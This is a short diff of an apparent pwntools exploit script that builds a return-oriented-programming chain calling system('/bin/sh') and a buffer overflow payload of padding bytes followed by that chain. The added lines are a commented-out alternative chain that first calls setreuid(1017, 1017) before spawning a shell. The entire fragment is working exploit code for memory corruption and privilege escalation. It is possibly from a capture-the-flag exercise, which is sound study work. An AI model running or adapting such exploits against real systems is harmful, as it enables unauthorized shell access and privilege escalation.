@@ -30,6 +30,11 @@ rop_chain += p64(BIN_SH)
 rop_chain += p64(rop.ret[0])
 rop_chain += p64(SYSTEM)
 
+# rop = ROP(libc, badchars=b"\n")
+# rop.setreuid(1017, 1017)
+# rop.raw(rop.ret)
+# rop.system(next(libc.search(b"/bin/sh")))
+
 exploit = b"A"*(24 + 64)
 exploit += rop_chain
 exploit += b"\n"
